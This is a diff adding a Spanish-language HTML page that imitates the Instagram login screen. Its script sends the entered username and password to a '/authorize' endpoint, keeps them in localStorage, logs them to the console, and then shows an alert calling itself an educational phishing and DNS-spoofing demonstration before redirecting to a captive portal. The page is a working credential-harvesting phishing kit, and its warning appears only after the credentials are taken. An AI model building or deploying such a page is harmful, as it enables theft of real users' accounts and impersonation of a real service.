@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Iniciar sesión</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .login-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 40px;
+            margin-bottom: 10px;
+            width: 100%;
+        }
+        .logo {
+            text-align: center;
+            margin: 22px auto 12px;
+        }
+        .logo img {
+            width: 175px;
+        }
+        form {
+            margin-top: 24px;
+        }
+        input {
+            width: 100%;
+            background-color: #fafafa;
+            padding: 9px 8px;
+            margin: 4px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+        button {
+            width: 100%;
+            padding: 7px;
+            margin: 10px 0;
+            background-color: #0095F6;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #1877f2;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            width: 100%;
+        }
+        .divider-line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        .divider-text {
+            margin: 0 10px;
+            font-size: 13px;
+            font-weight: bold;
+            color: #8e8e8e;
+        }
+        .facebook-login {
+            color: #385185;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            font-size: 14px;
+            font-weight: 500;
+            margin: 15px 0;
+        }
+        .forgot-password {
+            font-size: 12px;
+            color: #385185;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .signup {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            width: 100%;
+        }
+        .signup p {
+            font-size: 14px;
+        }
+        .signup a {
+            color: #0095F6;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .apps {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .apps p {
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+        .app-buttons img {
+            height: 40px;
+        }
+        .footer {
+            margin-top: 60px;
+            text-align: center;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .footer-links a {
+            color: #8e8e8e;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        .copyright {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
+            </div>
+            <form id="loginForm">
+                <div>
+                    <input type="text" id="username" placeholder="Teléfono, usuario o correo electrónico" required>
+                    <input type="password" id="password" placeholder="Contraseña" required>
+                    <button type="submit">Iniciar sesión</button>
+                </div>
+                <div class="divider">
+                    <div class="divider-line"></div>
+                    <div class="divider-text">O</div>
+                    <div class="divider-line"></div>
+                </div>
+                <div class="facebook-login">
+                    <span>Iniciar sesión con Facebook</span>
+                </div>
+                <div class="forgot-password">
+                    <a href="#">¿Olvidaste tu contraseña?</a>
+                </div>
+            </form>
+        </div>
+        <div class="signup">
+            <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
+        </div>
+        <div class="apps">
+            <p>Descarga la aplicación.</p>
+            <div class="app-buttons">
+                <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_spanish-es.png/69f6c1e42f51.png" alt="App Store"></a>
+                <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_spanish-es.png/e9cd60d5f829.png" alt="Google Play"></a>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Meta</a>
+                <a href="#">Información</a>
+                <a href="#">Blog</a>
+                <a href="#">Empleo</a>
+                <a href="#">Ayuda</a>
+                <a href="#">API</a>
+                <a href="#">Privacidad</a>
+                <a href="#">Condiciones</a>
+                <a href="#">Cuentas destacadas</a>
+                <a href="#">Hashtags</a>
+                <a href="#">Ubicaciones</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Threads</a>
+            </div>
+            <div class="copyright">
+                © 2025 Instagram from Meta
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Capturar credenciales
+            fetch('/authorize', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    site: 'Instagram',
+                    email: username,
+                    password: password
+                })
+            })
+            .then(response => {
+                // Crear un registro local de las credenciales
+                const date = new Date().toLocaleString();
+                const logData = `[${date}] Usuario: ${username}, Password: ${password}\n`;
+                
+                // Guardar en localStorage para poder verlo más tarde
+                const storedLogs = localStorage.getItem('capturedCredentials') || '';
+                localStorage.setItem('capturedCredentials', storedLogs + logData);
+                
+                console.log('Credenciales capturadas:', username, password);
+                
+                // Mostrar mensaje educativo
+                setTimeout(() => {
+                    alert('DEMOSTRACION EDUCATIVA DE PHISHING\n\n' +
+                          'Credenciales capturadas:\n' +
+                          'Usuario: ' + username + '\n\n' +
+                          'Esto demuestra como funciona el DNS Spoofing y phishing:\n' +
+                          '1. DNS redirigió instagram.com a un servidor local\n' +
+                          '2. El servidor sirvio esta pagina falsa\n' +
+                          '3. Sus credenciales fueron capturadas\n\n' +
+                          'PROTECCION:\n' +
+                          '• Siempre verifique el certificado HTTPS\n' +
+                          '• No ignore advertencias de seguridad\n' +
+                          '• Use autenticacion de dos factores\n\n' +
+                          'Esta es una demostracion con fines educativos.');
+                    
+                    // Redirigir al portal cautivo para autorizar
+                    window.location.href = '/authorize?email=' + encodeURIComponent(username);
+                }, 500);
+            })
+            .catch(error => {
+                console.error('Error enviando credenciales:', error);
+                // Aún así, redirigir
+                window.location.href = '/authorize?email=' + encodeURIComponent(username);
+            });
+        });
+
+        // Crear un método para visualizar las credenciales capturadas (para fines educativos)
+        window.viewCapturedCredentials = function() {
+            const credentials = localStorage.getItem('capturedCredentials') || 'No hay credenciales capturadas';
+            console.log('Credenciales almacenadas:', credentials);
+            return credentials;
+        };
+    </script>
+</body>
+</html>
